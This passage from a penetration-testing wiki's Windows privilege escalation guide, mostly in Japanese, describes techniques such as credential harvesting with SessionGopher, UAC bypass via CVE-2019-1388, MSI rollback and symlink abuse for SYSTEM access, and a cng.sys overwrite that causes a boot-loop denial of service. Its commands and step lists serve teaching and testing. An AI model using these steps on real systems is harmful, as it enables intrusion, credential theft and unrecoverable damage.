[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出するもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) はこのデータを平文で保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の **sessions**, **usernames** and **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[この例を読んで、この脆弱性を**検出し悪用する方法**の詳細を確認してください。](leaked-handle-exploitation.md)\
[こちらの投稿は、異なる権限レベルで継承されたプロセスやスレッドのより多くのオープンハンドラ（フルアクセスだけでなく）をテストし悪用する方法について、より詳しい説明を提供します。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

共有メモリセグメント、いわゆる**pipes**はプロセス間の通信とデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、異なるネットワーク上であってもデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントがパイプを通してデータを送信すると、そのパイプを設定した**server**は、必要な**SeImpersonate**権限を持っていれば**client**のアイデンティティを引き受けることができます。あなたが模倣できるパイプ経由で通信する**privileged process**を特定すれば、あなたが作成したパイプとやり取りする際にそのプロセスのアイデンティティを取得して**より高い権限を得る**機会が生まれます。この攻撃の実行手順については、[**ここ**](named-pipe-client-impersonation.md)および[**ここ**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールはburpのようなツールでnamed pipeの通信をインターセプトすることを可能にします: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)  
そしてこのツールはprivescsを見つけるためにすべてのパイプを一覧表示して確認することを可能にします: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

次のページを確認してください: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

ユーザーとしてシェルを得た場合、スケジュールされたタスクやその他のプロセスが**コマンドライン上で資格情報を渡している**ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態と前回の状態を比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console や RDP 経由）にアクセスでき、UAC が有効になっている場合、特定の Microsoft Windows バージョンでは、権限のないユーザーから "NT\AUTHORITY SYSTEM" のような端末や任意のプロセスを実行できる可能性があります。

これにより、同じ脆弱性を利用して権限昇格と UAC バイパスを同時に行うことが可能になります。さらに、何もインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受ける主なシステムは次のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator（Medium から High Integrity Level へ）/ UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

攻撃は基本的に Windows Installer の rollback 機能を悪用して、アンインストール時に正規ファイルを悪意あるファイルに置き換えることを目的としています。そのために、攻撃者は `C:\Config.Msi` フォルダをハイジャックするための **malicious MSI installer** を作成する必要があります。Windows Installer は後に他の MSI パッケージのアンインストール中に rollback ファイルを保存するためにこのフォルダを使用し、rollback ファイルは悪意あるペイロードを含むように改変されます。

手法の概要は以下の通りです:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- `.msi` を作成し、書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする。
- インストーラを **"UAC Compliant"** にマークして、**非管理者ユーザー**でも実行できるようにする。
- インストール後、ファイルへの **handle** を開いたままにする。

- Step 2: Begin Uninstall
- 同じ `.msi` をアンインストールする。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、それらを `.rbf` ファイル（rollback のバックアップ）にリネームし始める。
- `GetFinalPathNameByHandle` を使用して **開いているファイルハンドルをポーリング** し、ファイルが `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- Step 3: Custom Syncing
- `.msi` には **カスタムアンインストールアクション (`SyncOnRbfWritten`)** が含まれており:
- `.rbf` が書き込まれたときにシグナルを送る。
- その後、アンインストールを続行する前に別のイベントで **待機する**。

- Step 4: Block Deletion of `.rbf`
- シグナルを受け取ったら、`FILE_SHARE_DELETE` なしで **`.rbf` ファイルを開く** — これによりそのファイルは **削除されなくなる**。
- その後、アンインストールが完了できるように **シグナルを返す**。
- Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: Manually Delete `.rbf`
- あなた（攻撃者）は `.rbf` ファイルを手動で削除する。
- これで **`C:\Config.Msi` は空** になり、ハイジャック可能になる。

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自分で `C:\Config.Msi` フォルダを再作成する。
- **弱い DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持ったハンドルを開いたままにしておく。

- Step 7: Run Another Install
- `.msi` を再度インストールする、次の設定で:
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制失敗を引き起こす変数。
- このインストールは再度 **rollback** をトリガーするために使われ、`.rbs` と `.rbf` を読み取る。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待つ。
- そのファイル名を取得する。

- Step 9: Sync Before Rollback
- `.msi` には **カスタムインストールアクション (`SyncBeforeRollback`)** が含まれ:
- `.rbs` が作成されたときにイベントでシグナルを送る。
- その後、続行する前に **待機する**。

- Step 10: Reapply Weak ACL
- `.rbs 作成` イベントを受け取った後:
- Windows Installer は `C:\Config.Msi` に強い ACL を再適用する。
- しかし、あなたは `WRITE_DAC` を持つハンドルを残しているため、再び弱い ACL を **再適用できる**。

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` ファイルを上書きして、Windows に次を実行させる **偽の rollback スクリプト** を配置する:
- 悪意ある `.rbf`（malicious DLL）を特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元するよう指示する。
- 悪意ある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` をドロップする。

- Step 12: Trigger the Rollback
- 同期イベントをシグナルしてインストーラを再開させる。
- type 19 カスタムアクション (`ErrorOut`) が設定されており、既知のポイントでインストールを **意図的に失敗** させる。
- これにより **rollback が開始** される。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer はあなたの悪意ある `.rbs` を読み、
- 目的の場所にあなたの `.rbf` DLL をコピーする。
- これで **SYSTEM がロードするパスに悪意ある DLL が設置される**。

- Final Step: Execute SYSTEM Code
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、ハイジャックした DLL をロードさせる。
- **Boom**: あなたのコードが **SYSTEM として実行される**。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

メインの MSI rollback 手法（前述のもの）は、**フォルダ全体**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、もし脆弱性が **任意のファイル削除のみ** を許す場合はどうでしょうか？

この場合、**NTFS internals** を悪用できます: すべてのフォルダには次のような隠しの代替データストリームが存在します:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION` ストリームを削除すると**、NTFS はファイルシステムから**フォルダ全体を削除します**。

これは、次のような標準のファイル削除APIを使って実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダ自体が削除されます**。

### フォルダの内容の削除から SYSTEM EoP へ
もしあなたのプリミティブが任意のファイル/フォルダを削除できないとしても、**攻撃者が制御するフォルダの*内容*の削除を許可する**場合はどうしますか？

1. ステップ 1: 罠用のフォルダとファイルをセットアップ
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. ステップ 2: `file1.txt` に **oplock** を配置する
- 特権プロセスが `file1.txt` を削除しようとすると、その oplock は **実行を一時停止** します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ3: SYSTEMプロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt`に到達すると、**oplock triggers** が発生し、制御があなたのコールバックに渡されます。

4. ステップ4: oplock callback 内で – 削除をリダイレクトする

- オプションA: `file1.txt`を別の場所に移動する
- これにより`folder1`は空になりますが、oplockは壊れません。
- `file1.txt`を直接削除しないでください — それはoplockを早期に解放してしまいます。

- オプションB: `folder1`を**junction**に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS の内部ストリームを標的にしています — それを削除するとフォルダ自体が削除されます。

5. ステップ 5: oplock を解放

- SYSTEM プロセスが続行し、`file1.txt` の削除を試みます。
- しかし今は、junction + symlink のため、実際に削除しているのは次のとおりです:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### 任意のフォルダ作成から恒久的な DoS へ

SYSTEM/admin として **任意のフォルダを作成できる** プリミティブを悪用する — たとえ **ファイルを書き込めない** または **弱い権限を設定できない** 場合でも。

**フォルダ**（ファイルではなく）を**重要な Windows ドライバー**の名前で作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- それを**事前にフォルダとして作成すると**、Windows は起動時に実際のドライバを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダを認識し、**実際のドライバを解決できず**、**クラッシュするか起動が停止します**。
- **フォールバックはなく**、外部からの介入（例: ブート修復やディスクアクセス）なしでは**復旧できません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / ブート DoS へ

権限を持つサービスがログ/エクスポートを**書き込み可能な設定**から読み取ったパスに書き込む場合、そのパスを**Object Manager symlinks + NTFS mount points**でリダイレクトして、特権の書き込みを任意の上書きに変えることができます（**SeCreateSymbolicLinkPrivilege**なしでも可能）。

**要件**
- ターゲットパスを格納する設定ファイルが攻撃者により書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` にマウントポイントを作成でき、OM ファイル symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**実例**
1. 設定を読み取り、特権ログの出力先を取得する。例: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` が `C:\ProgramData\ICONICS\IcoSetup64.ini` 内にある。
2. 管理者権限なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 待って特権コンポーネントがログを書き込むのを待つ（例：管理者が "send test SMS" を実行）。書き込みは現在 `C:\Windows\System32\cng.sys` に行われる。
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する；再起動によって Windows が改ざんされたドライバパスを読み込むため → **boot loop DoS**。これは特権サービスが書き込みのために開く任意の保護されたファイルにも一般化される。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在する場合はそちらを優先して試みられることがあり、破損データの信頼できる DoS シンクとなり得る。



## **From High Integrity to System**

### **新しいサービス**

すでに High Integrity プロセスで動作している場合、**SYSTEM へのパス**は**新しいサービスを作成して実行するだけで**簡単に得られることがある：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であるか、そうでない場合はバイナリが必要な処理を十分に速く実行することを確認してください。そうしないと valid service でない場合に 20s で終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated registry entries を有効化**し、_**.msi**_ wrapper を使って reverse shell を**インストール**することを試みることができます。\
[レジストリキーの詳細と _.msi_ パッケージのインストール方法はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**ここで** [**コードを確認できます**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っていれば（おそらく既に High Integrity プロセス内で見つかるでしょう）、SeDebug privilege を使って（protected processes ではない）ほとんどのプロセスを**開く**ことができ、プロセスの**token をコピー**し、その token で**任意のプロセスを作成**できます。\
この技術では通常、全ての token privileges を持つ SYSTEM として実行されているプロセスを選択します（_はい、全ての token privileges を持たない SYSTEM プロセスも見つかります_）。\
[**提案した技術を実行するコードの例はこちら**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使用されます。手法は**パイプを作成し、そのパイプに書き込むために service を作成/悪用する**というものです。すると、パイプを作成した **server** が **`SeImpersonate`** privilege を使ってパイプクライアント（service）の **token をインパーソネート**し、SYSTEM privileges を取得できます。\
[**名前付きパイプについて詳しく知りたい場合はこちらを参照してください**](#named-pipe-client-impersonation)。\
[**名前付きパイプを使って high integrity から System へ移行する例はこちらを参照してください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

もし SYSTEM として動作する **process** によって **ロード** される **dll を hijack** できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格に有用であり、さらに high integrity プロセスから達成する方がはるかに**容易**です。high integrity プロセスは dll をロードするフォルダに対して **write permissions** を持っているためです。\
[**Dll hijacking の詳細はこちら**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows のローカル権限昇格ベクターを探すための最良のツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations や sensitive files をチェックします（**[**詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations をチェックし情報を収集します（**[**詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, および RDP の保存済みセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS スプーファーおよびマンインザミドルツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc 用 Windows 列挙ツール**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc 脆弱性を検索します（Watson に置換され DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin 権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc 脆弱性を検索します（VisualStudio でコンパイルする必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して misconfigurations を探します（privesc というより情報収集ツール）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェックします（GitHub に実行可能ファイルあり）。推奨しません。Win10 ではあまりうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations をチェックします（python から生成された exe）。推奨しません。Win10 ではあまりうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 本投稿に基づいて作成されたツール（accesschk がなくても動作しますが、使用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害ホストにインストールされている .NET のバージョンを確認するには以下を実行できます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
